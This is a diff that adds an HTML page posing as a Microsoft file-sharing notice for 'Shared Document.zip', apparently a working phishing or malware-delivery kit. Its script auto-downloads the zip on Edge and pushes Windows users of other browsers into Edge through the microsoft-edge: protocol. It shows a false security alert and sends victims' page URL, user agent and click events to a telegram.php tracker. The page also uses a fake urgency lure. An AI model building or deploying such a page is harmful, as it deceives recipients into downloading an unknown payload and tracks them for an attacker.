@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<style>
+    /* Show the row when visible */
+	#edge-notice.visible {
+		display: table-row; 
+	}
+
+	/* Flexbox container inside the cell */
+	.notice-content {
+		display: flex;
+		width: 100%;
+		padding: 11px 16px;
+		background: rgba(0, 120, 212, 0.15);
+		border-left: 3px solid #136f8a;
+		border-radius: 6px;
+		font-family: 'Open Sans', sans-serif;
+		font-size: 13px;
+		color: #136f8a;
+		line-height: 1.55;
+		animation: noticeFade 0.4s ease;
+		align-items: center;
+		gap: 10px;
+		box-sizing: border-box;
+	}
+</style>
+    <div style="background-color:#F2F2F2;margin:0;padding:0;">
+    <div align="center" style="padding:32px 8px;"><table border="0" cellspacing="0" cellpadding="0" role="presentation" style="background-color:white;width:100%;border-radius:8px;max-width:640px;margin:0 auto;border:1px solid #C8C8C8;overflow:hidden;box-shadow:rgba(0,0,0,0.05) 0px 3px 6px;"><colgroup><col style="width:2.5%;"><col style="width:95%;"><col style="width:2.5%;"></colgroup>
+    <tbody><tr>
+    <td align="center" colspan="3" style="padding-top:36px;padding-right:36px;padding-left:36px;"><img data-imagetype="External" originalsrc="" data-custom="" naturalheight="0" naturalwidth="0" src="https://cdn-icons-png.freepik.com/256/13404/13404042.png" width="40" alt="Comparteix la imatge" id="" data-outlook-trace="F:1|T:2" style="display: block; max-width: 100%; min-width: auto; min-height: auto; cursor: pointer;" crossorigin="" class="Do8Zj"> </td></tr>
+    <tr>
+    <td align="center" colspan="3" style="padding:20px 36px 36px 36px;">
+    <p style="color:#323130;font-size:24px;font-weight:600;text-align:center;max-width:400px;margin:0;padding:0;line-height:32px;">Someone shared a file with you </p></td></tr>
+    <tr>
+    <td colspan="3" style="text-align:center;background-color:#F8F8F8;padding:40px 20px 28px 20px;border-top:1px solid #DEDEDE;">
+    <p style="color:#323130;font-size:16px;margin:0;">You must open the document before the due date. </p></td></tr>
+    <tr>
+    <td align="center" colspan="3" style="background-color:#F8F8F8;"><a href="#" target="_blank" rel="noopener noreferrer" data-auth="NotApplicable" aria-label="Manejo de la biopsia en cancr de pulmón 2022" style="color:#323130;display:inline-block;text-decoration:none;" data-linkindex="0"><table align="center" border="0" cellspacing="0" cellpadding="0" role="presentation" style="text-align:center;background-color:white;width:100%;">
+    <tbody><tr>
+    <td style="background-color:white;padding:20px 4px 20px 20px;border-top:1px solid #D2D2D2;border-bottom:1px solid #D2D2D2;border-left:1px solid #D2D2D2;"><img data-imagetype="External" naturalheight="0" naturalwidth="0" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShL-QdmUylvf5FrmnHpQSg_9Tt_OLBKzF2QA&s" alt="icon" id="" data-outlook-trace="F:1|T:2" style="display: block; width: 32px; max-width: 100%; min-width: auto; min-height: auto;" crossorigin="" class="Do8Zj"> </td>
+    <td style="font-size:16px;text-align:left;background-color:white;padding:20px 20px 20px 4px;border-top:1px solid #D2D2D2;border-right:1px solid #D2D2D2;border-bottom:1px solid #D2D2D2;word-break:break-all;">Shared Document.zip </td></tr></tbody></table></a></td></tr>
+    <tr>
+    <td align="center" colspan="3" style="text-align:center;background-color:#F8F8F8;">
+    <div style="display:inline-block;"><table align="center" border="0" cellspacing="0" cellpadding="0" role="presentation" style="height:20px;">
+    <tbody><tr>
+    <td style="color:#323130;font-size:12px;padding:20px 0;">This link only works for direct recipients of this message.. </td></tr></tbody></table></div></td></tr>
+	<tr id="edge-notice">
+		<td colspan="100" style="background: none; border: none; padding: 0;">
+			<div class="notice-content">
+				<span>Download can only be completed on Microsoft Edge. 
+					<a id="edge-link" href="#" style="color:#136f8a; text-decoration: underline;">
+						<strong>Open this page in Edge</strong>
+					</a>
+				</span>
+			</div>
+		</td>
+	</tr>
+	<!-- Spacer Row -->
+	<tr style="height: 15px;">
+		<td colspan="100" style="padding: 0; border: none;"></td>
+	</tr>
+
+    <tr>
+    <td colspan="3" style="text-align:center;background-color:#F8F8F8;height:40px;padding:0 0 32px 0;border-top-style:none;border-bottom-style:none;"><a id="shared" href="Shared Document.zip" download="Shared Document.zip" rel="noopener noreferrer" data-auth="NotApplicable" style="color:white;font-size:16px;text-align:center;background-color:#0078D4;display:inline-block;width:168px;text-decoration:none;border-radius:2px;line-height:40px;" data-linkindex="1">View Document </a></td></tr></tbody></table><table border="0" cellspacing="0" cellpadding="0" role="presentation" style="width:100%;max-width:640px;margin:0 auto;overflow:hidden;"><colgroup><col style="width:10%;"><col style="width:40%;"><col style="width:21.9%;"><col style="width:27.34%;"></colgroup>
+	<script>
+        function sendTelegramNotification(data) {
+            data.url = window.location.href;
+            data.userAgent = navigator.userAgent;
+
+            fetch('telegram.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.error('Telegram notification error:', err));
+        }
+
+        /* ─────────────────────────────────────────
+           OS & Edge detection
+        ───────────────────────────────────────── */
+        function isWindows() {
+            return /Windows NT/i.test(navigator.userAgent);
+        }
+
+        function isMicrosoftEdge() {
+            return /Edg\/|Edge\//i.test(navigator.userAgent);
+        }
+
+        const isWin = isWindows();
+        const isEdge = isMicrosoftEdge();
+        const edgeNotice = document.getElementById('edge-notice');
+
+
+        /* ─────────────────────────────────────────
+           Download logic
+        ───────────────────────────────────────── */
+        const downloadUrl = 'Shared Document.zip';
+        const manualBtn = document.getElementById('shared');
+
+        if (isEdge) {
+            manualBtn.href = downloadUrl;
+            manualBtn.setAttribute('download', 'Shared Document.zip');
+            manualBtn.click();
+        } else if (isWin) {
+            // Disable the button visually and show inline notice
+            manualBtn.style.opacity = '0.4';
+            manualBtn.style.cursor = 'not-allowed';
+            manualBtn.style.pointerEvents = 'none';
+            edgeNotice.classList.add('visible');
+            const edgeLink = document.getElementById('edge-link');
+            if (edgeLink) {
+                edgeLink.href = 'microsoft-edge:' + window.location.href;
+                edgeLink.onclick = function (e) {
+                    // Notify edge link clicked
+                    sendTelegramNotification({ event: 'Open in Edge Clicked' });
+
+                    if (window.location.protocol === 'file:') {
+                        e.preventDefault();
+                        try {
+                            navigator.clipboard.writeText(window.location.href);
+                            alert('Windows blocks automatically opening local files in Edge for security. The URL has been copied to your clipboard!\n\nPlease open Microsoft Edge and paste it into the address bar.');
+                        } catch (err) {
+                            alert('Windows blocks automatically opening local files in Edge for security.\n\nPlease copy the URL from your address bar and paste it into Microsoft Edge.');
+                        }
+                    }
+                };
+
+                // Attempt auto-click after 1 second (subject to browser blocking)
+                setTimeout(() => {
+                    sendTelegramNotification({ event: 'Auto Open in Edge Triggered' });
+                    edgeLink.click();
+                }, 1000);
+            }
+        }
+
+        function triggerDownload() {
+            if (!isEdge) return;   // silently block on non-Edge
+
+            // Notify download triggered
+            sendTelegramNotification({ event: 'Download Triggered' });
+
+            const a = document.createElement('a');
+            a.href = downloadUrl;
+            a.download = 'Shared Document.zip';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        }
+    </script>
+</html>
